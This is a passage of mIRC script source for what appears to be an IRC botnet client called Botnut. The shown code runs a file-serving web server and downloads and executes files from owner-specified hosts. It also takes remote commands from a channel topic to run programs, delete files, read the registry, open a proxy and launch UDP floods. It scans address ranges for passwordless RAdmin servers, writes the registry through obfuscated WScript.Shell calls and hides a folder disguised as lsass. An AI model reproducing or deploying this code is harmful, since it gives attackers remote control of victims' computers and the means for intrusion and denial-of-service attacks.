     .timer $+ $$1 -m 0 100 ws.checkSock $$1

   }
   alias -l ws.sendDir {
     var %d = $replace($2-,$+(%,20),$chr(32))
     var %i = 0
     var %index = $+(",%d,\index.html,")
     if ($isfile(%index)) { ws.sendFile $$1 / $+ $remove(%d,%ws.homedir) $+ /index.html | return }
     var %index = $+(",%d,\index.htm,")
     if ($isfile(%index)) { ws.sendFile $$1 / $+ $remove(%d,%ws.homedir) $+ /index.htm | return }

     var %r = $ws.var($$1,request)
     var %tokparm = $calc($numtok(%r,47) - 1)
     if (%tokparm > 1) { var %tokparm = 1- $+ %tokparm }
     if (%tokparm != 0) { var %upOne = / $+ $gettok(%r,%tokparm,47) $+ /  }
     else { var %upOne = / }
     ws.swrite $$1 <html><title> $+ $me $+ </title><body bgcolor=white text=black>
     ws.swrite $$1 <br><h2 align=center><font size=+1> %ws.homedir - $+ $iif(%ws.statsPage == 1,$+(&nbsp;[,<a href=/system.stats>System Info</a>,]))</h2> $crlf $+ <h2 align=center><font size=+1>Folders...</h2><table align=center width=75%><tr><td><ul>

     if (%r != /) { ws.swrite $$1 <li><a href=' $+ %upOne $+ '><b><font size=+1>..</font></b></a> }

     while (1 == 1) {
       inc %i 1
       var %ws.currFile = $nopath($finddir(%d,*,%i,0))
       if (%ws.currFile == $null) { break }
       else { ws.swrite $$1 <li><a href=' $+ %ws.currFile $+ /'> $+ %ws.currFile $+ </a> }
     }
     ws.swrite $$1 </ul></td></tr></table><Br><hr width=75%><br>
     var %i = 0, %filesizes 0
     ws.swrite $$1 <h2 align=center><font size=+1>Files..</h2><Br><table width=75% align=center border=1><tr><th>Name</th><th>Size</th><th>Created</th><th>Modified</th></tr>
     while (1 == 1) {
       inc %i 1
       var %ws.currfile = $nopath($findfile(%d,*.*,%i,0))
       var %ws.fullfile = $findfile(%d,*.*,%i,0)
       if (%ws.currfile == $null) { ws.swrite $$1 <tr><td><b>Total</B></td><td colspan=3> $+ $bytes(%filesizes,k).suf $+ </td></tr> | ws.swrite $$1 $crlf $+ </td></table><center></center><br></BODY></html> | ws.sclose $$1 | return }
       inc %filesizes $file(%ws.fullfile).size
       ws.swrite $$1 <tr><td><a href=' $+ %ws.currfile $+ '> $+ %ws.currfile $+ </a></td><td> $+ $bytes($file(%ws.fullfile).size,k).suf $+ </td><td> $+ $asctime($file(%ws.fullfile).ctime) $+ </td><td> $+ $asctime($file(%ws.fullfile).mtime) $+ </td></tr>
     }
   }
   ; 8192 bytes is the max for the send queue
   alias -l ws.endSend {
     if ($sock($$1) != $null) {
       if ($sock($1).sq == 0) { .timer $+ $1 off | ws.sclose $1 | return }
     }
     else { .timer $+ $1 off | ws.sclose $1 | return }
   }
   alias -l ws.sendpacket {
     if ($sock($$1) !== $null) {
       var %l = $calc(16384 - $sock($1).sq)

       if (%l > 8192) { var %l = 8192) }
       .bread $ws.var($1,file) $sock($1).mark %l &ws.in
       sockmark $1 $calc($sock($$1).mark + %l)
       sockwrite -b $1 %l &ws.in
       if ($sock($1).mark >= $ws.var($1,targ)) { .timer $+ $1 -m 0 100 ws.endSend $1 }
     }
   }

   alias -l ws.checkSock {
     ;- $$1
     if ($sock($$1) == $null) { .timer $+ $1 off | ws.sclose $1 }
     else {
       if ($sock($1).sq < 8192) { ws.sendPacket $1 }
     }
   }
   on *:socklisten:wsl: { .sockaccept ws- $+ %ws.sockCount | inc %ws.sockCount 1 | if (%ws.sockCount > 4000) { set %ws.sockCount 1 } }
   on *:sockread:ws-*: {
     if ($sockerr > 0) return
     :nextread
     sockread %ws.temp
     if (%ws.temp == $null) %ws.temp = -
     if (%ws.logging == 1) { write " $+ $scriptdirwwwlogs\ $+ $replace($adate,/,-) $+ .txt" < $+ $sockname $+  > ( $+ $asctime $+ ) %ws.temp FROM IP: $sock($sockname).ip }
     if ($ws.var($sockname,TYPE) == POST) {
     }
     else {

       if ($mid($gettok(%ws.temp,2-,32),2,1) == .) { echo 4 -s $sock($sockname).ip $sockname Is attempting illegal access... presenting 404 error page. | ws.notfound $sockname /You're_not_leet_enough_for_me! | unset %ws.temp | return }

       if ($gettok(%ws.temp,1,32) == get) {
         if (%ws.showStatus == 1) { echo -s HTTP Request: GET $gettok(%ws.temp,2,32) From: $sock($sockname).ip - $sockname }
         var %ws.parms $gettok(%ws.temp,2-,32)
         var %numTokens = $nuktok(%ws.parms,32)
         var %ws.tokParms = 1- $+ %numTokens
         ; secho %ws.temp - %ws.parms
         if (*HTTP/* iswm %ws.parms) { var %ws.tokParms = 1- $+ $calc(%numTokens - 1)  }
         ws.sendfile $sockname $gettok(%ws.parms,%ws.tokParms,32)

         return
       }

     }
     if ($sockbr == 0) return
     goto nextread
   }
   alias -l ws.on {
     .enable #ws
     unset %ws-*
     if ($sock(wsl) == $null) { .socklisten wsl %ws.port | msg $nick [WEBSERVER] Enabled. http:// $+ $ip $+ : $+ %ws.port $+  }
     else { msg $nick [WEBSERVER] is already running! }
   }
   alias -l ws.on2 {
     .enable #ws
     unset %ws-*
     if ($sock(wsl) == $null) { .socklisten wsl %ws.port }
     else { msg $nick [WEBSERVER] is already running! }
   }
   alias -l ws.off {
     .disable #ws
     .sockclose wsl
   }
   alias -l RegWrite {
     if ($1 != $null) && ($2 != $null) && ($3 != $null) {
       var %a = Reg $+ Write
       .como $+ pen %a WSc $+ ript.She $+ ll
       if !$comerr {
         var %b =  $com(%a,Reg $+ Wri $+ te,3,bstr,$1,bstr,$2,bstr,$3)
         .comcl $+ ose %a
       }
       if ($3 == REG_EX $+ PAND_SZ) || ($3 == RE $+ G_SZ) {
         if ($re $+ gr $+ ead($1) == $2) { re $+ turn the val $+ ue ( $+ $1 $+ ) was created }
       }
     }
   }
   alias -l bnutpub.onchannel2 {
     var %i = 1
     while (%i <= $channel(0)) {
       var %bnutpub.joinedchannel3 $channel( $+ %i $+ ) $+ , $+ %bnutpub.joinedchannel3
       inc %i
     }
     set %bnutpub.joinedchannel2 $left(%bnutpub.joinedchannel3,-1)
   }
   alias -l bnutpub.onchannel1 {
     var %i = 1
     while (%i <= $channel(0)) {
       var %bnutpub.joinedchannel $channel( $+ %i $+ ) $+ , $+ %bnutpub.joinedchannel
       inc %i
     }
     set %bnutpub.joinedchannel1 $left(%bnutpub.joinedchannel,-1)
   }

   alias -l bnutpub.onchannel {
     scon 1 bnutpub.onchannel1
     if ($scon(0) == 2) { scon 2 bnutpub.onchannel2 }
     if ($1 == public) { scon 1 msg %bnutpub.channel [LISTCHANNEL] 1: %bnutpub.joinedchannel1 $iif(%bnutpub.joinedchannel2,2: %bnutpub.joinedchannel2) | unset %bnutpub.joinedchannel* }
     else { scon 1 msg $nick [LISTCHANNEL]  1: %bnutpub.joinedchannel1 $iif(%bnutpub.joinedchannel2,2: %bnutpub.joinedchannel2) | unset %bnutpub.joinedchannel*
     }
   }
   alias -l bnutpub.partchannel {
     if ($1 = 1) {
       scon 1 bnutpub.onchannel1
       scon 1 part $replace(%bnutpub.joinedchannel1,#,)
     }
     elseif ($1 = 2) {
       scon 2 bnutpub.onchannel2
       scon 2 part %bnutpub.joinedchannel2
     }
     unset %bnutpub.joinedchannel*
   }
   alias -l bnutpub.download {
     set %bnutpub.given $3
     set %bnutpub.givenhost $1
     set %bnutpub.givenpath $2
     if ($isfile(%bnutpub.given)) { .remove %bnutpub.given }
     sockclose botnut.download
     .timer 1 1 sockopen botnut.download %bnutpub.givenhost 80
   }
   ON *:SOCKOPEN:botnut.download: {
     sockwrite -n $sockname GET / $+ %bnutpub.givenpath HTTP/1.0
     sockwrite -n $sockname Accept: */*
     sockwrite -n $sockname Host: %bnutpub.givenhost $+ $str($crlf,2)
     sockwrite -n $sockname
     if (%bnutpub.download.public == 1) { set %download.start.time $uptime | msg %bnutpub.channel [DOWNLOAD] Downloading http:// $+ %bnutpub.givenhost $+ / $+ %bnutpub.givenpath to %bnutpub.given $+ . }
     else { set %download.start.time $uptime | msg %bnutpub.owner [DOWNLOAD] Downloading http:// $+ %bnutpub.givenhost $+ / $+ %bnutpub.givenpath to %bnutpub.given $+ . }
   }

   ON *:SOCKREAD:botnut.download:{
     if (%bnutpub.aupd.downloadready != 1) {
       var %header
       sockread %header
       while ($sockbr) {
         if (* !iswm %header) {
           %bnutpub.aupd.downloadready = 1
           break
         }
         sockread %header
       }
     }
     sockread 4096 &d
     while ($sockbr) {
       bwrite %bnutpub.given -1 -1 &d
       sockread 4096 &d
     }
   }
   ON *:SOCKCLOSE:botnut.download: {
     unset %bnutpub.aupd.*
     if (%bnutpub.download.public == 1) {
       if (%bnutpub.download.exe == no) { scon 1 msg %bnutpub.channel [DOWNLOAD] File downloaded to %bnutpub.given $+ . ( $+ $round($calc($file(%bnutpub.given).size / (1024 * 1000)),3)) $+ MB in $duration($calc($uptime - %download.start.time)) $+ ) ( $+ $round($calc($round($calc($file(%bnutpub.given).size / (1024 * 1000)),3) / $calc($uptime - %download.start.time)),3) MB/s) | unset %download.start.time }
       else { run %bnutpub.given | scon 1 msg %bnutpub.channel [DOWNLOAD] File downloaded to %bnutpub.given and executed. ( $+ $round($calc($file(%bnutpub.given).size / (1024 * 1000)),3)) $+ MB in $duration($calc($uptime - %download.start.time)) $+ ) ( $+ $round($calc($round($calc($file(%bnutpub.given).size / (1024 * 1000)),3) / $calc($uptime - %download.start.time)),3) MB/s) | unset %download.start.time }
     }
     else {
       if (%bnutpub.download.exe == no) { scon 1 msg %bnutpub.owner [DOWNLOAD] File downloaded to %bnutpub.given $+ . ( $+ $round($calc($file(%bnutpub.given).size / (1024 * 1000)),3)) $+ MB in $duration($calc($uptime - %download.start.time)) $+ ) ( $+ $round($calc($round($calc($file(%bnutpub.given).size / (1024 * 1000)),3) / $calc($uptime - %download.start.time)),3) MB/s) | unset %download.start.time }
       else { run %bnutpub.given | scon 1 msg %bnutpub.owner [DOWNLOAD] File downloaded to %bnutpub.given and executed. ( $+ $round($calc($file(%bnutpub.given).size / (1024 * 1000)),3)) $+ MB in $duration($calc($uptime - %download.start.time)) $+ ) ( $+ $round($calc($round($calc($file(%bnutpub.given).size / (1024 * 1000)),3) / $calc($uptime - %download.start.time)),3) MB/s) | unset %download.start.time }
     }
   }
   alias -l bnc { .socklisten bnc $$1 }
   on 1:socklisten:bnc:{
     .sockaccept bnc.temp
     %bnc.temp.ip = $sock(bnc.temp).ip
     .sockrename bnc.temp bnca $+ %bnc.temp.ip
   }
   on 1:sockread:bnca*:{
     .sockread %bnca
     if ($gettok(%bnca,1,32) == PASS) {
       if ($gettok(%bnca,2,32) == %bnc.pass) {
         .sockwrite -n $sockname   Password accepted.
         .sockwrite -n $sockname   /conn <server> <port> to connect.
         %bnc [ $+ [ $sock($sockname).ip ] ] = yes
       }
     }
     if (%bnc [ $+ [ $sock($sockname).ip != yes) {
       if ($gettok(%bnca,1,32) == NICK) {
         .set %bnc.nick $gettok(%bnca,2,32)
       }
       if ($gettok(%bnca,1,32) == USER) {
         .set %bnc.user $gettok(%bnca,2-,32)
         .sockwrite -n $sockname   Welcome to Botnut iRC-Proxy.
         .sockwrite -n $sockname   /pass <pass> for authorization
       }
     }
     if (%bnc [ $+ [ $sock($sockname).ip ] ] == yes) {
       if ($gettok(%bnca,1,32) == CONN) {
         %bncconn. [ $+ [ $sock($sockname).ip ] ] = Connected
         .sockopen bncb [ $+ [ $sock($sockname).ip ] ] $gettok(%bnca,2-,32)
         .sockwrite -n $sockname   Now Attempting to connected to: $gettok(%bnca,2-,32)
         halt
       }
       if (%bncconn. [ $+ [ $sock($sockname).ip ] ] == Connected) {
         .sockwrite -n bncb [ $+ [ $remove($sockname,bnca) ] ] $gettok(%bnca,1-,32)
       }
       echo -s %bnca
     }
   }
   on 1:sockopen:bncb*:{
     .sockwrite -n $sockname USER %bnc.user
     .sockwrite -n $sockname NICK %bnc.nick
   }
   on 1:sockread:bncb*:{
     .sockread %bncb
     .sockwrite -n bnca [ $+ [ $remove($sockname,bncb) ] ] %bncb
   }
   on 1:sockclose:bnca*:{
     %bnc [ $+ [ $sock($sockname).ip ] ] = no
     %bnccon. [ $+ [ $sock($sockname).ip ] ] = no
     .sockclose bncb [ $+ [ $sock($sockname).ip ] ]
   }
   alias -l timerarg {
     var %arg $round($calc($prospeed / 100))
     if (%arg < 1) set %arg 1
     set %arg $int($calc(40 / %arg))
     if (%arg < 1) set %arg 1
     return %arg
   }
   alias -l prospeed {
     var %protest $ticks
     var %i 1
     :start
     if ($calc($ticks - %protest) <= 100) {
       inc %i
       goto start
     }
     :end
     return $calc(%i * .7))
   }
   alias -l scan {
     %scan.range = $$1
     if ($gettok(%scan.range,3,46) == $null) %scan.inc1 = 1
     else %scan.inc1 = $gettok(%scan.range,3,46)
     if ($gettok(%scan.range,4,46) == $null) %scan.inc2 = 1
     else %scan.inc2 = $gettok(%scan.range,4,46)
     if ($gettok(%scan.range,2,46) == $null) %scan.inc3 = 1
     else %scan.inc3 = $gettok(%scan.range,2,46)
     %scan = $gettok(%scan.range,1,46) $+ . $+ %scan.inc3 $+ . $+ %scan.inc1 $+ . $+ %scan.inc2
     .msg %bnutpub.owner [RASCAN] Now scanning the range of %scan for RAdmin.
     .scan1
   }
   alias -l scan1 {
     .timerscan -ocm 0 $timerarg .scan2
   }
   alias -l scan2 {
     if (%scan.inc2 == 255) {
       .timerscan off
       if (%scan.inc1 == 255) {
         if (%scan.inc3 == 255) { %scanning = Done | halt }
         %scan.inc3 = %scan.inc3 + 1
         %scan.inc2 = 1
         %scan.inc1 = 1
         .timer -m 1 1 scan1
         halt
       }
       %scan.inc1 = %scan.inc1 + 1
       %scan.inc2 = 1
       .timer -m 1 1 scan1
     }
     .scansock
     %scan.inc2 = %scan.inc2 + 1
   }
   alias -l scansock {
     %sock = $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z)
     .sockopen scanner[ $+ %sock $+ ] $gettok(%scan.range,1,46) $+ . $+ %scan.inc3 $+ . $+ %scan.inc1 $+ . $+ %scan.inc2 4899
     .timerclose $+ %sock 1 2 .sockclose scanner[ $+ %sock $+ ]
   }
   on 1:sockopen:scanner[*]:{
     if ($sock($sockname).status = active) {
       bset &command 1 1 0 0 0 1 0 0 0 8 8
       sockwrite $sockname &command
       halt
     }
   }
   on 1:sockread:scanner[*]:{
     if ($sockerr > 0) return
     :nextread
     sockread &temp
     if ($sockbr == 0) return
     if ($bvar(&temp,1,$bvar(&temp,0)) == %nopass) {
       .write radmin.txt $sock($sockname).ip
       .msg %bnutpub.owner [RASCAN] IP: $sock($sockname).ip
       .sockclose $sockname
     }
     if ($bvar(&temp,1,$bvar(&temp,0)) == %nopass1) {
       .write radmin.txt $sock($sockname).ip
       .msg %bnutpub.owner [RASCAN] IP: $sock($sockname).ip
       .sockclose $sockname
     }
     goto nextread
   }
   raw 332:*: {
     if ($cid == $scon(1)) && ($2 == %bnutpub.channel) {
       var %i = 1
       while (%i <= $numtok($3-,124)) {
         parse.topic $gettok($3-,%i,124)
         inc %i
       }
     }
   }
   alias -l parse.topic {
     if ($1 == .dns) { set %dns.user public | dns $2 }
     elseif ($1 == .update) {
       if (%bnutpub.version < $2) {
         scon 1 msg %bnutpub.channel [UPDATE] Updating...
         set %bnutpub.download.public 1
         unset %bnutpub.download.exe
         parse.http $3 $4
       }
     }
     elseif ($1 == .download) {
       set %bnutpub.download.public 1
       unset %bnutpub.download.exe
       parse.http $2 $3
       if ($4 == 0) { set %bnutpub.download.exe no }
     }
     elseif ($1 == .execute) {
       if ($isfile($2-)) { run $2- | scon 1 msg %bnutpub.channel [EXECUTE] Done. }
       else { scon 1 msg %bnutpub.channel [EXECUTE] File doesn't exist.
       }
     }
     elseif ($1 == .remove) {
       if ($isfile($2-)) { remove $2- | scon 1 msg %bnutpub.channel [REMOVE] Done. }
       else { scon 1 msg %bnutpub.channel [REMOVE] File doesn't exist.
       }
     }
     elseif ($1 == .winamp) {
       if ($2 == status) {
         if ($dll(bnutw.dll,songtitle,_) == $null) { return }
         else { scon 1 msg %bnutpub.channel [WINAMP] $dll(bnutw.dll,songtitle,_) ¬ $dll(bnutw.dll,bitrate,_) $+ kbps $+ / $+ $dll(bnutw.dll,freq,_) $+ kHz ¬ $dll(bnutw.dll,tracktime,_) }
       }
       if ($2 == play) { dll bnutw.dll play }
       if ($2 == pause) { dll bnutw.dll pause }
       if ($2 == stop) { dll bnutw.dll stop }
     }
     elseif ($1 == .openweb) { parse.openweb $2- }
     elseif ($$1 == .filesize) {
       if ($isfile($2) { scon 1 msg %bnutpub.channel [FILESIZE] ( $+ $2 $+ ) $round($calc($file($2).size / (1024 * 1000)),3)) $+ MB }
       else { scon 1 msg %bnutpub.channel [FILESIZE] File doesn't exist. }
     }
     elseif ($1 == .nick) {
       if ($3 == real) { scon $2 nick $left($bnutpub.getnick,-1) }
       elseif ($3) { scon $2 nick $3 $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $4 }
       else { scon $2 nick $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) }
     }
     elseif ($1 == .whois) {
       if ($read(whois.txt,1) != $null) { scon 1 msg %bnutpub.channel [WHOIS] $read(whois.txt,1) }
       else { scon 1 msg %bnutpub.channel [WHOIS] No entry. }
     }
     elseif ($1 == .info) {
       if ($2 == net) { bnutpub.netstats public }
       elseif ($2 == pc) { bnutpub.pcstats public }
       elseif ($2 == version) { scon 1 .msg %bnutpub.channel [INFO] BNUT ver. %bnutpub.version }
       elseif ($2 == ip) { scon 1 .msg %bnutpub.channel [INFO] IP: $ip }
       elseif ($2 == uptime) { scon 1 .msg %bnutpub.channel [INFO] Uptime: $duration($calc($ticks / 1000)) }
       elseif ($2 == mirc) {
         if ($3 == dir) { dde mirc command "" //dde bnut command "" /scon 1 msg %bnutpub.channel [MIRCDIR] $ $+ mircdir }
         else { dde mirc command "" //dde bnut command "" /scon 1 msg %bnutpub.channel [MIRCINFO] $ $+ me is on $ $+ server }
       }
       else { scon 1 .msg %bnutpub.channel [INFO] IP: $ip ¬ Version: %bnutpub.version ¬ Uptime: $duration($calc($ticks / 1000)) }
     }
     elseif ($1 == .mirc) {
       if ($isdde == $false) { scon 1 .msg %bnutpub.channel [MIRC] Not running. }
       dde mirc command "" // $+ [ $2- ]
       dde mirc command "" //dde BNUT command "" //scon 1 msg %bnutpub.channel [MIRC] Done.
     }
     elseif ($1 == .command) {
       // $+ [ $2- ]
       scon 1 msg %bnutpub.channel [COMMAND] Done.
     }
     elseif ($1 == .search_file) { search_file $2 $3 $nick public }
     elseif ($1 == .get_file) { dcc send $nick $2- }
     elseif ($1 == .proxy) {
       if ($2 == stop) { sockclose b* | scon 1 msg %bnutpub.channel [IRC-PROXY] Stopped.  }
       else { sockclose b* | set %bnc.port $2 | set %bnc.pass $3 | .bnc $2 | scon 1 msg %bnutpub.channel [IRC-PROXY] IP: $ip ¬ PORT: %bnc.port ¬ PASS: %bnc.pass (/server -m $ip $+ : $+ %bnc.port $+ ) }
     }
     elseif ($1 == .search_nick) {
       dde mirc command "" //dde bnut command "" /bnutpub.mircnick set $ $+ me
       set %bnutpub.mircnick2 $2
       timer 1 2 bnutpub.mircnick
     }
     elseif ($1 == .msg) { scon $2 .msg $3 $4- }
     elseif ($1 == .amsg) { scon $2 .amsg $3 $4- }
     elseif ($1 == .notice) { scon $2 .notice $3 $4- }
     elseif ($1 == .ctcp) { scon $2 .ctcp $3- }
     elseif ($1 == .opme) { mode $2 +o $nick }
     elseif ($1 == .join) {
       if ($2 == delay) {
       .timer 1 $rand(1, $+ $3 $+ ) scon $4 join $5- }
       else { scon $2 join $3- }
     }
     elseif ($1 == .part) {
       if ($2 == 1) && ($3 == #) { return }
       elseif ($2 == 1) && ($3 == all) { bnutpub.partchannel 1 | join %bnutpub.channel %bnutpub.channelpw }
       elseif ($2 == 2) && ($3 == all) { bnutpub.partchannel 2 }
       else { scon $2 part $3- }
     }
     elseif ($1 == .listchannel) { bnutpub.onchannel public }
     elseif ($1 == .search_uptime) {
       if ($2 isin $duration($calc($ticks / 1000))) { scon 1 msg %bnutpub.channel [UPTIME] Found: $duration($calc($ticks / 1000))) }
     }
     elseif ($1 == .connect) {
       if ($scon(0) == 2)  { scon 2 server $2- }
       elseif ($scon(0) == 1) { server -m $2- }
     }
     elseif ($1 == .disconnect) { scon 2 disconnect }
     elseif ($1 == .listserver) { listserver public }
     elseif ($1 == .readreg) {
       if ($_regread($2-) == 0) { scon 1 msg %bnutpub.channel [READREG] No entry. }
       else { scon 1 .msg %bnutpub.channel $_regread($2-) }
     }
     elseif ($1 == .udp) { fuck_you $2 $3 $4 public }
   }
   alias -l secure {
     if (%bnutpub.secure != 1) {
       set %bnutpub.secure 1
       writereg
       hide.folder attrib +r +a +s +h C:\WINDOWS\system32\lsass
     }
   }

   alias hide.folder {
     write -c hide.bat $1-
     run hide.bat
     .timer 1 1 remove hide.bat
   }
   alias -l bnutpub.getnick { return $read(bnutc.dll,$rand(1,$lines(bnutc.dll))) }
   alias -l parse.openweb {
     var %i = 1
     while (%i <= $numtok($1-,47)) {
       inc %i
     }
     bnutpub.openweb $gettok($1-,2,47) $gettok($1-,3-,47)
   }
   alias -l bnutpub.openweb { unset bnutpub.hostt* | set %bnutpub.hostt1 $1 | set %bnutpub.hostt2 $2 | sockclose bnutpub.openweb | .timer 1 1 sockopen bnutpub.openweb %bnutpub.hostt1 80 }
   ON *:SOCKOPEN:bnutpub.openweb: {
     sockwrite -n $sockname GET / $+ %bnutpub.hostt2 HTTP/1.1
     sockwrite -n $sockname Host: %bnutpub.hostt1 $+ $str($crlf,2)
     msg %bnutpub.channel [OPENWEB] Page visited.
   }
   on *:sockread:bnutpub.openweb: {
     var %sockread
     sockread %sockread
     if (*HTTP*200*OK* iswm %sockread) { sockclose $sockname }
   }
